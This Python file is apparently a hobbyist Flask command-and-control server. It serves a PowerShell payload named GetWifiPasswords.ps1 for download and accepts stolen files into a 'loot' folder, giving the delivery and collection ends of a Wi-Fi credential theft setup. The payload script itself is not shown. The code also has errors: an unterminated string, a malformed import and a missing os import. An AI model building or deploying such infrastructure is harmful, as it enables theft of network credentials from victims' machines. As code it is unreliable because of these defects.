# 03/10/2022 Owen Throup basic flask C2 server.

# Import the flask functionality from the libraries
from flask import Flask, send_file, render_template,
                  url_for, request
from werkzeug import secure_filename

# Specify what files are allowed to be uploaded
FEXTS = ["pdf", "txt"]

# Create a flask instance
app = Flask(__name__)

# Set the destination upload folder and max file size.
app.config["UPLOAD_FOLDER"] = "/home/pi/C2/loot/"
app.config["MAX_CONTENT_PATH"] = 20000

def is_valid_filename(filename):
    """Determine whether a filename is valid or not"""
    return "." in filename and filename.rsplit(".", 1)[1].lower() in FEXTS

# When someone goes to "http://IP:PORT/payload" this is what happens...
# Here, "payload" is refered to as the "endpoint" or "route"
@app.route("/payload", methods=["GET"])
def payload():
    # Return the payload
    try:
        # Send file from path (mine is from my PI, you may need to change)
        # as_attachment means that it prompts to save with the same name.
        return send_file("/home/pi/C2/payloads/GetWifiPasswords.ps1",
                         as_attachment=True)
    # At this point something went wrong.
    except Exception as e:
        print("Something went wrong with the download - " + str(e))
        return str(e)

# When someone goes to http://IP:PORT/upload..."
# Permit both POST (for uploading) and get (for html file)
@app.route("/upload", methods=["GET", "POST"])
def upload():
    # If it's a POST request (uploading file)
    if request.method == "POST":
        # User didn't specify a file
        if "file" not in request.files:
            return "[ERR] - No file supplied"
        # Extract file from request
        file = request.files["file"]
        # No filename = no file
        if file.filename == "":
            return "[ERR] - No file supplied"
        # If the file exists and the name is valid (pdf, txt)
        if file and is_valid_filename(file.filename):
            filename = secure_filename(file.filename)
            # Save to specified upload folder and send response
            file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
            return "[INFO] - File uploaded successfully"
        # Error
        return "Something went wrong"
    # If it's a GET request - if the user just typed in the
    # route without wanting to upload anything, they probably
    # WANT to upload something, so serve up a basic HTML page
    # to allow them to do this (upload.html).
    # upload.html must be in a directory called "templates", in the CWD.
    elif request.method == "GET":
        return render_template("upload.html")
    # not GET, not POST, so we don't care.
    else:
        return "[ERR] - Unsupported request

# Ignore this line, just python practice
if __name__ == "__main__":
    # Run in debug mode, on the current machines IP (192.168.x.x), on port 5000
    # So our final address will be "http://192.168.x.x:5000/<ENDPOINT>
    app.run(debug=True, host="0.0.0.0", port=5000)
